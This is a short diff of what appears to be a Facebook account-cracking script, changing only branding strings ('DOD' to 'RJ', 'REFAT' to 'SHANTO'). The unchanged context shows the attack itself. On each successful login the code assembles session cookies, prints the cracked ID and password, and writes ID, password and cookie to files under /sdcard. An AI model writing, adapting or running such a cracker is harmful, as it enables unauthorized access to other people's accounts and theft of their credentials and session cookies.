@@ -6,7 +6,7 @@ import time, json, string
 from os import system as osRUB
 from os import system as cmd
 os.system('clear')
-print(' Checking DOD Server Please Wait...  ');time.sleep(1)
+print(' Checking RJ Server Please Wait...  ');time.sleep(1)
 try:
     import requests 
 except ImportError:
@@ -266,7 +266,7 @@ class main_crack():
                     ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);rsbhai = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"fh={rsbhai};{ckkk}"
                     print(f'\r\r\x1b[1;92m [SHANTO-OK] {rid} | {ps}\033[1;97m')
                     oks.append(rid)
-                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/REFAT_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
+                    open('/sdcard/SHANTO-OK.txt','a').write(rid+'|'+ps+'\n');open('/sdcard/SHANTO_iDs_COOKiES_M1.txt','a').write(rid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
                      ##print(f'\r\r\x1b[1;91m [SHANTO-CP] {rid} | {ps}\033[1;97m')
